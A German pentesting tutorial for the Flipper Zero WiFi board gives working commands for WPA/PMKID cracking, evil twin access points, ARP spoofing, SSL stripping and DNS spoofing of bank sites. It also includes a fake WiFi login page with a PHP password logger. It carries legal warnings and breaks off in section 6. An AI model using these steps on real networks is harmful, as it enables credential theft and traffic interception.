# Teil 3: WiFi Attack Scenarios
## Flipper Zero WiFi Dev Board Pentesting Tutorial

---

## Inhaltsverzeichnis

1. [Einführung zu Offensive WiFi Security](#1-einführung-zu-offensive-wifi-security)
2. [WPA/WPA2 Handshake Cracking](#2-wpawpa2-handshake-cracking)
3. [Evil Twin Access Points](#3-evil-twin-access-points)
4. [Man-in-the-Middle (MITM) Attacks](#4-man-in-the-middle-mitm-attacks)
5. [Credential Harvesting](#5-credential-harvesting)
6. [WPS PIN Attacks](#6-wps-pin-attacks)
7. [Karma und Mana Attacks](#7-karma-und-mana-attacks)
8. [Advanced Attack Chains](#8-advanced-attack-chains)
9. [Detection und Defense](#9-detection-und-defense)
10. [Praktische Übungen](#10-praktische-übungen)
11. [Command Cheatsheet](#11-command-cheatsheet)

---

## 1. Einführung zu Offensive WiFi Security

### Was ist ein WiFi Attack?

**Definition:**
Ein WiFi Attack ist eine gezielte Aktion um:
- Zugriff auf ein Netzwerk zu erlangen
- Daten abzufangen oder zu manipulieren
- Dienste zu unterbrechen (DoS)
- Credentials zu stehlen
- Kontrolle über Geräte zu erlangen

### Attack Chain Overview

**Typischer Penetration Test Flow:**

```
1. RECONNAISSANCE (Teil 1)
   └─> Passive Scanning
   └─> Netzwerk-Mapping
   └─> Client-Identification

2. ACTIVE RECON (Teil 2)
   └─> Deauthentication
   └─> Handshake Capture
   └─> MAC Spoofing
   └─> Active Probing

3. EXPLOITATION (Teil 3) ← WIR SIND HIER
   └─> Password Cracking
   └─> Evil Twin Setup
   └─> MITM Positioning
   └─> Credential Theft
   └─> Network Compromise

4. POST-EXPLOITATION
   └─> Lateral Movement
   └─> Data Exfiltration
   └─> Persistence
```

### Kill Chain für WiFi Attacks

**Phase 1: Credential Access**
- WPA Handshake Crack
- WPS PIN Bruteforce
- Social Engineering (Evil Twin)

**Phase 2: Network Access**
- Authentifizierung mit Credentials
- Evil Twin Verbindung
- MAC Spoofing

**Phase 3: Lateral Movement**
- ARP Spoofing
- DNS Hijacking
- Traffic Interception

**Phase 4: Privilege Escalation**
- Router Admin Access
- Gateway Compromise
- Network Infrastructure

**Phase 5: Persistence**
- Backdoor Installation
- Rogue AP
- Persistent MITM

### Rechtliche und Ethische Rahmen

**⚠️ EXTREM WICHTIG - BITTE LESEN:**

Alles in Teil 3 ist **hochgradig illegal** wenn ohne Autorisierung durchgeführt:

**Straftatbestände:**
- § 202a StGB: Ausspähen von Daten (bis 3 Jahre)
- § 202b StGB: Abfangen von Daten (bis 2 Jahre)
- § 303a StGB: Datenveränderung (bis 2 Jahre)
- § 303b StGB: Computersabotage (bis 3 Jahre, bei kritischer Infrastruktur bis 10 Jahre)

**Was du NIEMALS tun darfst:**
- ❌ Fremde WLANs ohne schriftliche Genehmigung angreifen
- ❌ Credentials von anderen Personen stehlen
- ❌ Öffentliche Hotspots kompromittieren
- ❌ Man-in-the-Middle auf fremden Traffic
- ❌ Firmennetzwerke ohne Security-Team Approval

**Was du darfst:**
- ✅ Eigenes Heimnetzwerk (du bist der Besitzer)
- ✅ Mit schriftlicher, expliziter Autorisierung
- ✅ In isolierten Test-Laboren
- ✅ Virtuelle WiFi-Umgebungen
- ✅ Im Rahmen autorisierter Penetration Tests

**Professionelles Pentesting:**
- Schriftlicher Vertrag (Scope, Timeline, Rules of Engagement)
- Non-Disclosure Agreement (NDA)
- Get-Out-of-Jail-Free Letter (Authorized Testing Document)
- Liability Insurance
- Dokumentation aller Aktivitäten
- Verantwortungsvolle Disclosure

**Best Practices:**
1. **Dokumentiere ALLES** - Logs, Screenshots, Timestamps
2. **Informiere Stakeholder** - Wer muss Bescheid wissen?
3. **Minimize Impact** - Teste außerhalb Geschäftszeiten
4. **Have Exit Strategy** - Wie stellst du alles wieder her?
5. **Report Responsibly** - Findings korrekt aufbereiten

### Tools und Vorbereitung

**Auf dem Flipper bereits vorhanden:**
- aircrack-ng Suite
- mdk4
- hostapd
- dnsmasq
- iptables

**Zusätzlich installieren (je nach Bedarf):**
```bash
# Für Evil Twin
apt-get install hostapd dnsmasq apache2

# Für MITM
apt-get install ettercap-text-only bettercap

# Für WPA Cracking (auf PC)
# hashcat, john, pyrit
```

**Laptop/PC Tools:**
- hashcat (GPU cracking)
- john the ripper
- Wireshark
- Browser (für Captive Portals)

---

## 2. WPA/WPA2 Handshake Cracking

### Theorie: Wie funktioniert das Cracking?

**Was wir haben (aus Teil 2):**
- Captured 4-Way-Handshake
- ESSID (Netzwerk-Name)
- BSSID (AP MAC)

**Was wir brauchen:**
- Pre-Shared Key (PSK) = Das Passwort

**Wie Cracking funktioniert:**

```
1. Passwort-Kandidat (z.B. "password123")
2. PBKDF2-Funktion mit ESSID als Salt
   PMK = PBKDF2(HMAC-SHA1, password, ESSID, 4096, 256)
3. Mit PMK berechnen wir PTK (Pairwise Transient Key)
   PTK = PRF(PMK, ANonce, SNonce, AP_MAC, Client_MAC)
4. Mit PTK berechnen wir MIC (Message Integrity Check)
5. Vergleichen mit MIC aus Handshake
6. Match = Passwort gefunden!
```

**Problem:**
- PBKDF2 mit 4096 Iterationen ist **langsam by design**
- Jeder Versuch dauert ~100ms auf CPU
- GPU kann parallelisieren → Millionen Versuche/Sekunde

**Attack-Typen:**
- **Dictionary Attack:** Wortliste durchprobieren
- **Brute Force:** Alle Kombinationen (a-z, 0-9, ...)
- **Hybrid:** Dictionary + Regel-basierte Mutationen
- **Rainbow Tables:** Vorberechnete Hashes (für bekannte ESSIDs)

### Cracking mit aircrack-ng (CPU)

**Einfachster Fall: Dictionary Attack**

#### Schritt 1: Wordlist erstellen/downloaden

**Option A: Kleine Test-Liste:**
```bash
# Auf dem Flipper
cat > /tmp/wordlist.txt << EOF
password
12345678
qwerty123
admin123
password123
welcome123
letmein
trustno1
EOF
```

**Option B: Bekannte Wordlists:**
```bash
# rockyou.txt (beliebteste Liste, ~14GB)
# Download auf PC, dann auf Flipper kopieren

# Oder kleinere Liste:
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
```

**Option C: Eigene generieren:**
```bash
# Mit crunch (Passwort-Generator)
apt-get install crunch

# 8-stellige Zahlen (00000000-99999999)
crunch 8 8 0123456789 -o /tmp/numbers.txt

# 8 Zeichen, lowercase + Zahlen
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o /tmp/alphanum.txt
# Warnung: Kann RIESIG werden!
```

#### Schritt 2: Cracking starten

```bash
# Basic Dictionary Attack
aircrack-ng -w /tmp/wordlist.txt /tmp/handshakes/handshake-01.cap

# Output:
#                                Aircrack-ng 1.x
#
#      [00:00:02] 8/8 keys tested (3.85 k/s)
#
#      Time left: 0 seconds                                      100.00%
#
#                           KEY FOUND! [ password123 ]
#
#      Master Key     : AB CD EF 01 23 45 67 89 ...
#      Transient Key  : ...
#      EAPOL HMAC     : ...
```

**Erfolg!** 🎉 Passwort ist "password123"

#### Erweiterte Optionen

**Mit ESSID spezifizieren (bei mehreren Netzwerken in CAP):**
```bash
aircrack-ng -w wordlist.txt -e "MeinNetz" handshake-01.cap
```

**Mit BSSID spezifizieren:**
```bash
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap
```

**Multi-Core nutzen:**
```bash
# aircrack-ng nutzt automatisch alle Cores
# Aber für bessere Performance: GPU nutzen (hashcat)
```

### Cracking mit hashcat (GPU - auf PC)

**Warum hashcat?**
- GPU-beschleunigt (100x - 1000x schneller)
- Unterstützt komplexe Attack-Modi
- Professioneller Standard

#### Schritt 1: Handshake konvertieren

**Auf dem Flipper (oder PC):**
```bash
# Installiere hcxtools
apt-get install hcxtools

# Konvertiere zu hashcat Format
hcxpcapngtool -o handshake.hc22000 handshake-01.cap

# Oder mit älterem Format (für hashcat <6.0):
hcxpcaptool -z handshake.hccapx handshake-01.cap
```

**Datei auf PC kopieren:**
```bash
# Via HTTP-Server wie in Teil 2
# Oder: scp wenn SFTP geht
```

#### Schritt 2: hashcat auf PC (Windows/Mac/Linux)

**Installation:**

**Windows:**
```powershell
# Download von: https://hashcat.net/hashcat/
# Extract zu C:\hashcat\
```

**macOS:**
```bash
brew install hashcat
```

**Linux:**
```bash
apt-get install hashcat
# Oder von hashcat.net für neueste Version
```

#### Schritt 3: Dictionary Attack

**Windows (CMD/PowerShell):**
```powershell
cd C:\hashcat
.\hashcat.exe -m 22000 -a 0 handshake.hc22000 wordlist.txt

# Parameter:
# -m 22000  = WPA-PBKDF2-PMKID+EAPOL (hashcat 6.0+)
# -a 0      = Dictionary attack
```

**macOS/Linux:**
```bash
hashcat -m 22000 -a 0 handshake.hc22000 wordlist.txt
```

**Output:**
```
hashcat (v6.x.x) starting...

* Device #1: NVIDIA GeForce RTX 3080, 10240/12288 MB

Hashfile 'handshake.hc22000' on line 1: Token length exception
...
Dictionary cache built:
* Filename..: wordlist.txt
* Passwords.: 1000000
* Bytes.....: 8529089
* Keyspace..: 1000000

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =>

<BSSID>:<MAC>:<MAC>:<ESSID>::password123

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Time.Started.....: Mon Jan 01 12:00:00 2024
Time.Estimated...: Mon Jan 01 12:00:15 2024 (15 secs)
```

**Passwort gefunden: "password123"**

#### Erweiterte hashcat Modi

**Brute Force (alle Kombinationen):**
```bash
# 8 Zeichen, lowercase
hashcat -m 22000 -a 3 handshake.hc22000 ?l?l?l?l?l?l?l?l

# Mask-Optionen:
# ?l = lowercase (a-z)
# ?u = uppercase (A-Z)
# ?d = digits (0-9)
# ?s = special characters
# ?a = all (l+u+d+s)

# Beispiel: "Password" + 2 Zahlen
hashcat -m 22000 -a 3 handshake.hc22000 Password?d?d
```

**Hybrid Attack (Dictionary + Mask):**
```bash
# Wörter aus Wörterbuch + 2 Zahlen am Ende
hashcat -m 22000 -a 6 handshake.hc22000 wordlist.txt ?d?d

# Zahlen am Anfang + Wörter
hashcat -m 22000 -a 7 handshake.hc22000 ?d?d wordlist.txt
```

**Rule-based Attack (Mutationen):**
```bash
# Mit Regeln (Leetspeak, Kapitalisierung, etc.)
hashcat -m 22000 -a 0 handshake.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Eigene Regel erstellen:
# In rule.txt:
# :        = Do nothing (pass through)
# l        = Lowercase all
# u        = Uppercase all
# c        = Capitalize first, lowercase rest
# $1       = Append '1'
# ^1       = Prepend '1'
```

**Combinator Attack:**
```bash
# Kombiniert Wörter aus zwei Listen
hashcat -m 22000 -a 1 handshake.hc22000 list1.txt list2.txt

# Beispiel: list1.txt = "password", list2.txt = "123"
# Versucht: "password123"
```

### Performance Optimierung

**hashcat Tuning:**
```bash
# Workload erhöhen (Desktop = -w 3, Server = -w 4)
hashcat -m 22000 -a 0 -w 3 handshake.hc22000 wordlist.txt

# Optimized Kernel
hashcat -m 22000 -a 0 -O handshake.hc22000 wordlist.txt

# Beide kombiniert (maximum Speed)
hashcat -m 22000 -a 0 -w 4 -O handshake.hc22000 wordlist.txt
```

**Benchmark:**
```bash
# Teste deine Hardware
hashcat -b -m 22000

# Output zeigt H/s (Hashes per Second)
# RTX 3080: ~500 kH/s
# RTX 4090: ~1000 kH/s
# CPU: ~5-10 kH/s
```

**Zeitschätzung:**

```
Passwort-Länge | Charset      | Kombinationen | Zeit @ 500kH/s
8 Zeichen      | lowercase    | 26^8 = 208B   | ~133 Stunden
8 Zeichen      | lower+digits | 36^8 = 2.8T   | ~1627 Stunden
8 Zeichen      | all          | 95^8 = 6.6Q   | ~420 Jahre
10 Zeichen     | all          | 95^10 = 59.8Q | ~380.000 Jahre
```

**Fazit:**
- Schwache Passwörter: Minuten bis Stunden
- Starke Passwörter (12+ Zeichen, komplex): Praktisch unknackbar

### PMKID Attack (kein Handshake nötig!)

**Neu seit 2018: PMKID-basierter Angriff**

**Was ist PMKID?**
- Teil des ersten EAPOL-Frames (Robust Security Network)
- AP sendet PMKID = HMAC-SHA1-128(PMK, "PMK Name", AP_MAC, Client_MAC)
- Enthält PMK-Ableitung
- **Kann ohne Client-Verbindung captured werden!**

#### Capture mit hcxdumptool

```bash
# Installiere hcxdumptool
apt-get install hcxdumptool

# Monitor Mode
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

# Capture starten (zielt auf PMKID)
hcxdumptool -i wlan0 -o pmkid.pcapng --enable_status=1

# Läuft und captured automatisch
# Warte 5-10 Minuten
# Ctrl+C zum Stoppen

# Konvertiere für hashcat
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# Crack wie gewohnt
hashcat -m 22000 -a 0 pmkid.hc22000 wordlist.txt
```

**Vorteile:**
- Kein Deauth nötig
- Kein Client nötig
- Komplett passiv möglich

**Nachteil:**
- Funktioniert nicht bei allen Routern/APs
- Neuere Router haben Patches

---

## 3. Evil Twin Access Points

### Theorie: Was ist ein Evil Twin?

**Definition:**
Ein Evil Twin ist ein **gefälschter Access Point** der:
- Gleichen SSID wie legitimes Netzwerk hat
- Oft stärkeres Signal
- Clients verbinden sich unwissentlich
- Angreifer hat volle Kontrolle über Traffic

**Angriffs-Szenario:**
```
1. Angreifer erstellt Fake-AP mit gleichem SSID
2. Deauth auf echtem AP (Clients werden getrennt)
3. Clients suchen Netzwerk und finden Evil Twin
4. Clients verbinden sich mit Evil Twin (stärkeres Signal)
5. Angreifer captured alle Daten
6. Optional: Forwarding zu echtem Internet (MITM)
```

**Use Cases:**
- Credential Harvesting
- Traffic Sniffing
- MITM Attacks
- Phishing

### Evil Twin Setup mit hostapd

#### Vorbereitung: Zwei WiFi-Interfaces nötig

**Problem:**
- Ein Interface = Fake AP
- Zweites Interface = Internet-Uplink

**Lösungen:**

**Option 1: Zweiter USB-WiFi-Dongle**
- Stecke zusätzlichen USB-WiFi-Adapter an Flipper
- wlan0 = Evil Twin AP
- wlan1 = Internet Connection

**Option 2: Ethernet-Bridge (wenn verfügbar)**
- wlan0 = Evil Twin AP  
- eth0 = Internet via Kabel

**Option 3: Ohne Internet (nur Sniffing)**
- wlan0 = Evil Twin AP
- Kein Uplink (Clients bekommen kein Internet)

**Für dieses Tutorial: Option 3 (einfachste)**

#### Schritt 1: hostapd konfigurieren

**Installiere hostapd:**
```bash
apt-get update
apt-get install hostapd
```

**Erstelle Config-Datei:**
```bash
nano /tmp/hostapd.conf
```

**Inhalt (Open Network):**
```
interface=wlan0
driver=nl80211
ssid=MeinNetz
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
```

**Inhalt (WPA2 - mit gefaktem Passwort):**
```
interface=wlan0
driver=nl80211
ssid=MeinNetz
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=FakePassword123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
```

**Parameter erklärt:**
- `interface`: Welches WiFi-Interface
- `ssid`: Netzwerk-Name (kopiere das echte!)
- `hw_mode`: g = 2.4GHz, a = 5GHz
- `channel`: Gleicher oder anderer Kanal als Original
- `wpa_passphrase`: Fake-Passwort (Clients probieren echtes, bekommen Fehler)

#### Schritt 2: Interface vorbereiten

```bash
# Managed Mode (nicht Monitor!)
ip link set wlan0 down
iw dev wlan0 set type managed
ip link set wlan0 up

# IP-Adresse zuweisen (für DHCP später)
ip addr add 192.168.10.1/24 dev wlan0
```

#### Schritt 3: hostapd starten

```bash
# Test-Start (Foreground)
hostapd /tmp/hostapd.conf

# Du solltest sehen:
# wlan0: interface state UNINITIALIZED->ENABLED
# wlan0: AP-ENABLED

# Evil Twin ist jetzt live!
# Clients sehen "MeinNetz" in ihrer WiFi-Liste
```

**In anderem Terminal / von deinem Laptop:**
- Schaue in WiFi-Liste
- "MeinNetz" sollte erscheinen (evtl. zweimal - echt + fake)
- Versuche Verbindung (funktioniert noch nicht ohne DHCP)

#### Schritt 4: DHCP-Server (dnsmasq)

**Clients brauchen IP-Adressen:**

```bash
# Installiere dnsmasq
apt-get install dnsmasq

# Stoppe default Service
systemctl stop dnsmasq

# Erstelle Config
cat > /tmp/dnsmasq.conf << EOF
interface=wlan0
dhcp-range=192.168.10.10,192.168.10.100,12h
dhcp-option=3,192.168.10.1
dhcp-option=6,192.168.10.1
server=8.8.8.8
log-queries
log-dhcp
EOF

# Starte dnsmasq
dnsmasq -C /tmp/dnsmasq.conf -d

# -d = debug/foreground Mode
```

**Was das macht:**
- DHCP-Server auf wlan0
- Vergibt IPs: 192.168.10.10 - 192.168.10.100
- Gateway (Option 3): 192.168.10.1 (wir)
- DNS (Option 6): 192.168.10.1 (wir)

#### Schritt 5: Clients verbinden sich

**Jetzt können Clients:**
- SSID sehen
- Verbinden (Open Network)
- IP bekommen
- DNS-Anfragen stellen

**Traffic monitoren:**
```bash
# In weiterem Terminal
tcpdump -i wlan0 -w /tmp/evil_twin_capture.pcap

# Oder live anschauen:
tcpdump -i wlan0 -n
```

**Connected Clients sehen:**
```bash
# Zeige DHCP-Leases
cat /var/lib/misc/dnsmasq.leases

# Output:
# 1609459200 aa:bb:cc:dd:ee:ff 192.168.10.50 iPhone *
# 1609459300 11:22:33:44:55:66 192.168.10.51 Android *
```

### Evil Twin mit Internet (MITM)

**Für vollständiges MITM mit Internet-Zugriff:**

#### Setup mit zwei Interfaces

**Annahme:**
- wlan0 = Evil Twin AP
- wlan1 = Connected zu echtem WLAN (Internet)

**Schritt 1: wlan1 mit Internet verbinden:**
```bash
# wpa_supplicant für wlan1
wpa_passphrase "EchtesWLAN" "echtesPasswort" > /tmp/wpa.conf
wpa_supplicant -B -i wlan1 -c /tmp/wpa.conf
dhclient wlan1

# Teste Internet
ping -I wlan1 -c 3 8.8.8.8
```

**Schritt 2: IP Forwarding aktivieren:**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward

# Oder persistent:
sysctl -w net.ipv4.ip_forward=1
```

**Schritt 3: NAT/Masquerading (iptables):**
```bash
# Flush alte Regeln
iptables -F
iptables -t nat -F

# Masquerading (wlan0 → wlan1)
iptables -t nat -A POSTROUTING -o wlan1 -j MASQUERADE

# Forward erlauben
iptables -A FORWARD -i wlan0 -o wlan1 -j ACCEPT
iptables -A FORWARD -i wlan1 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT

# Speichern
iptables-save > /tmp/iptables.rules
```

**Jetzt:**
- Clients verbinden sich mit Evil Twin (wlan0)
- Bekommen Internet über wlan1
- **Gesamter Traffic geht durch dich!**

### Traffic Sniffing im Evil Twin

**Alle HTTP-Requests sehen:**
```bash
tcpdump -i wlan0 -A 'tcp port 80'

# Zeigt:
# GET /index.html HTTP/1.1
# Host: example.com
# ...
```

**Credentials in POST-Requests:**
```bash
tcpdump -i wlan0 -A -s 0 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'

# Filtert POST-Requests
# Zeigt Body mit Passwörtern (falls unverschlüsselt!)
```

**Mit Wireshark analysieren:**
```bash
# Capture speichern
tcpdump -i wlan0 -w /tmp/evil_twin_traffic.pcap

# Auf PC analysieren
# Follow TCP Stream für komplette Sessions
```

---

## 4. Man-in-the-Middle (MITM) Attacks

### ARP Spoofing

**Theorie:**

ARP (Address Resolution Protocol) mappt IP ↔ MAC:
- "Wer hat IP 192.168.1.1?" → "Ich (MAC: aa:bb:cc:dd:ee:ff)"
- Nicht authentifiziert
- Angreifer kann falsche Antworten senden

**Attack:**
1. Victim denkt: Gateway = Angreifer-MAC
2. Gateway denkt: Victim = Angreifer-MAC
3. Traffic fließt durch Angreifer

#### ARP Spoofing mit arpspoof

```bash
# Installiere dsniff
apt-get install dsniff

# Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Terminal 1: Spoof Victim → Gateway
arpspoof -i wlan0 -t 192.168.1.50 192.168.1.1

# Terminal 2: Spoof Gateway → Victim
arpspoof -i wlan0 -t 192.168.1.1 192.168.1.50

# Jetzt bist du in der Mitte!
```

**Traffic capturen:**
```bash
# Terminal 3
tcpdump -i wlan0 -w mitm_capture.pcap
```

#### ARP Spoofing mit bettercap

**Bettercap = Modernes MITM Framework**

```bash
# Installiere
apt-get install bettercap

# Starte bettercap
bettercap -iface wlan0

# Im bettercap Prompt:
net.probe on
net.show

# ARP Spoofing starten (gesamtes Netzwerk)
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# Oder nur spezifisches Target
set arp.spoof.targets 192.168.1.50
arp.spoof on

# Sniffer aktivieren
net.sniff on

# Zeige captured Credentials
net.sniff.stats

# HTTP/HTTPS Sniffer
http.proxy on
https.proxy on
```

**Bettercap Caplets (Scripts):**
```bash
# Erstelle caplet
cat > /tmp/mitm.cap << 'EOF'
net.probe on
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
net.sniff on
http.proxy on
EOF

# Ausführen
bettercap -iface wlan0 -caplet /tmp/mitm.cap
```

### SSL Stripping

**Problem:**
- HTTPS ist verschlüsselt
- MITM kann Inhalt nicht lesen

**SSL Strip Attack:**
1. Intercept HTTPS-Request
2. Ersetze HTTPS mit HTTP
3. Client spricht HTTP mit Angreifer
4. Angreifer spricht HTTPS mit Server
5. Angreifer sieht unverschlüsselten Traffic

#### SSL Stripping mit sslstrip

```bash
# Installiere
apt-get install sslstrip

# Setup iptables (redirect HTTPS → sslstrip)
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080

# Starte sslstrip
sslstrip -l 8080 -w /tmp/sslstrip.log

# ARP Spoof (in anderem Terminal)
arpspoof -i wlan0 -t 192.168.1.50 192.168.1.1

# Victims surfen jetzt über dich
# HTTPS wird zu HTTP downgraded
# Credentials in /tmp/sslstrip.log
```

**sslstrip Log analysieren:**
```bash
cat /tmp/sslstrip.log

# Zeigt:
# 2024-01-01 12:34:56 POST https://www.example.com/login
# username=victim@email.com&password=secretpass123
```

#### SSL Strip mit bettercap

```bash
bettercap -iface wlan0

# Im bettercap:
http.proxy on
https.proxy on
set https.proxy.sslstrip true

arp.spoof on
```

**Moderne Browser-Schutz:**
- HSTS (HTTP Strict Transport Security)
- Browser erzwingt HTTPS
- SSL Strip funktioniert nicht mehr für HSTS-Sites
- Aber: Viele Sites haben kein HSTS

### DNS Spoofing

**Redirect Victims zu Fake-Seiten:**

#### DNS Spoof mit dnsspoof

```bash
# Installiere
apt-get install dsniff

# Erstelle hosts-Datei
cat > /tmp/dns_hosts << EOF
192.168.1.100 www.google.com
192.168.1.100 www.facebook.com
192.168.1.100 www.bank.com
EOF

# 192.168.1.100 = Deine Fake-Server IP (kann Flipper sein)

# Starte dnsspoof
dnsspoof -i wlan0 -f /tmp/dns_hosts

# Wenn Victim zu google.com geht → landet bei dir!
```

#### DNS Spoof mit bettercap

```bash
bettercap -iface wlan0

# DNS Spoofer konfigurieren
set dns.spoof.domains www.bank.com,*.bank.com
set dns.spoof.address 192.168.1.100
dns.spoof on

# Alle bank.com Anfragen gehen zu 192.168.1.100
```

### Kombinierter MITM Attack

**Komplett Setup:**

```bash
# 1. IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. ARP Spoofing (Evil Twin oder echtes Netzwerk)
arpspoof -i wlan0 -t 192.168.1.0/24 192.168.1.1

# 3. SSL Stripping
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
sslstrip -l 8080 -w /tmp/sslstrip.log &

# 4. DNS Spoofing
dnsspoof -i wlan0 -f /tmp/dns_hosts &

# 5. Traffic Capture
tcpdump -i wlan0 -w /tmp/mitm_full.pcap &

# Jetzt:
# - Du bist Gateway für alle
# - HTTPS → HTTP
# - DNS zu Fake-Sites
# - Alles geloggt
```

---

## 5. Credential Harvesting

### Captive Portal (Fake Login)

**Szenario:**
- Evil Twin mit offener Verbindung
- Clients verbinden sich
- Zeige Fake-Login-Seite
- Stehle Credentials

#### Setup: Apache Webserver

```bash
# Installiere Apache
apt-get install apache2

# Starte Apache
systemctl start apache2

# Test
curl http://localhost
```

#### Fake Login Page erstellen

```bash
# Erstelle HTML-Datei
cat > /var/www/html/login.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login Required</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            width: 350px;
        }
        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 15px;
        }
        button:hover {
            background: #5568d3;
        }
        .info {
            text-align: center;
            color: #666;
            font-size: 12px;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔒 WiFi Authentication</h2>
        <form action="login.php" method="POST">
            <input type="text" name="ssid" placeholder="Network Name (SSID)" required>
            <input type="password" name="password" placeholder="Network Password" required>
            <button type="submit">Connect to WiFi</button>
        </form>
        <div class="info">
            Please enter your WiFi credentials to continue
        </div>
    </div>
</body>
</html>
EOF
```

#### PHP Handler für Credentials

```bash
# Installiere PHP
apt-get install php libapache2-mod-php

# Erstelle PHP-Script
cat > /var/www/html/login.php << 'EOF'
<?php
// Log credentials
$ssid = $_POST['ssid'] ?? '';
$password = $_POST['password'] ?? '';
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];

// Save to file
$logfile = '/tmp/harvested_credentials.txt';
$entry = "$timestamp | IP: $ip | SSID: $ssid | Password: $password\n";
file_put_contents($logfile, $entry, FILE_APPEND);

// Redirect to "success" or real site
header('Location: http://www.google.com');
exit;
?>
EOF

# Restart Apache
systemctl restart apache2
```

#### DNS Redirect zu Captive Portal

**Alle DNS-Anfragen → dein Webserver:**

```bash
# dnsmasq Config anpassen
cat >> /tmp/dnsmasq.conf << EOF
address=/#/192.168.10.1
EOF

# Restart dnsmasq
killall dnsmasq
dnsmasq -C /tmp/dnsmasq.conf -d
```

**Jetzt:**
- Client verbindet sich mit Evil Twin
- Öffnet Browser → jede Website geht zu login.html
- Gibt Credentials ein
- Du loggst sie in /tmp/harvested_credentials.txt

#### Credentials checken

```bash
tail -f /tmp/harvested_credentials.txt

# Output:
# 2024-01-01 12:34:56 | IP: 192.168.10.50 | SSID: MeinNetz | Password: SuperSecret123
# 2024-01-01 12:35:12 | IP: 192.168.10.51 | SSID: MeinNetz | Password: Password123
```

### Verbesserungen: Realistischere Captive Portals

**Clone echte Login-Seite:**

```bash
# Mit httrack (Website Cloner)
apt-get install httrack

# Clone z.B. Router-Login
httrack "http://192.168.1.1" -O /var/www/html/router_clone

# Oder Hotel-WiFi Portal, Airport-WiFi, etc.
```

**Oder nutze Social Engineering Toolkit (SET):**

```bash
# SET installieren (auf PC besser als Flipper)
apt-get install set

# Starte SET
setoolkit

# → Social-Engineering Attacks
# → Website Attack Vectors
# → Credential Harvester Attack Method
# → Site Cloner
# → Enter target URL
```

---

## 6. WPS PIN Attacks

### Theorie: WPS Schwachstelle

**WPS (WiFi Protected Setup):**
- Vereinfachte Verbindung zu WPA2-Netzwerken
- 8-stelliger PIN (z.B. 12345678)
- Push-Button oder PIN-Entry

**Schwachstelle:**
- PIN wird in zwei Hälften geprüft (4 + 4 Ziffern)
- Erste 4 Ziffern: 10.000 Möglichkeiten
- Letzte 3 Ziffern: 1.000 Möglichkeiten (letzte Ziffer ist Checksum)
- **Total: Nur 11.000 Versuche statt 100.000.000!**

**Attack-Zeit:**
- Pro Versuch: ~2 Sekunden (Rate-Limiting vom AP)
- Worst Case: 11.000 × 2s = 22.000s = ~6 Stunden

### WPS Bruteforce mit Reaver

```bash
# Installiere Reaver
apt-get install reaver

# Monitor Mode
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

# Finde WPS-enabled APs
wash -i wlan0

# Output:
# BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
# AA:BB:CC:DD:EE:FF   6   -45  2.0  No   Linksys   MeinNetz
```

**WPS 2.0 = Anfällig, Lck = Unlocked**

**Starte Reaver:**
```bash
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -vv

# Parameter:
# -i wlan0               = Interface
# -b AA:BB:CC:DD:EE:FF   = Target BSSID
# -vv                    = Verbose

# Output:
# [+] Waiting for beacon from AA:BB:CC:DD:EE:FF
# [+] Received beacon from AA:BB:CC:DD:EE:FF
# [+] Trying pin "12345670"
# [+] Sending authentication request
# ...
# [+] Trying pin "23456781"
# ...
# [+] WPS PIN: '12345678'
# [+] WPA PSK: 'SuperSecret123'
# [+] AP SSID: 'MeinNetz'
```

**Erfolg!** PIN und Passwort gefunden.

**Erweiterte Optionen:**

```bash
# Mit delay (langsamer, umgeht Rate-Limiting)
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -d 5 -vv

# Mit bekannten ersten 4 Ziffern
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -p 1234 -vv

# Session speichern (fortsetzbar)
reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -s sessions/ -vv
# Bei Abbruch: Fortsetzen
